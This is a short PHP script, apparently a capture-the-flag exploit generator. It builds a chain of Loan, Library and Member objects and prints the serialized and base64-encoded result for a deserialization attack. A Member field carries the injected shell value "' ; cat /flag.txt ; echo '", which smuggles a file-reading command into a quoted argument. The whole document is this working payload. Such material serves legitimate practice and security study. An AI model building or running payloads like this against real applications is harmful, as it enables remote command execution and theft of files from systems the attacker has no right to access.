<?php
class Loan {
    public $items = [];
}
class Library {
    public $name;
    public $collection;
}
class Member {
    public $name;
    public $borrowed = [];
}

$m = new Member();
$m->borrowed = ["' ; cat /flag.txt ; echo '"];

$l = new Library();
$l->collection = $m;

$loan = new Loan();
$loan->items = [$l];

echo serialize($loan);
echo "\n";
echo base64_encode(serialize($loan));
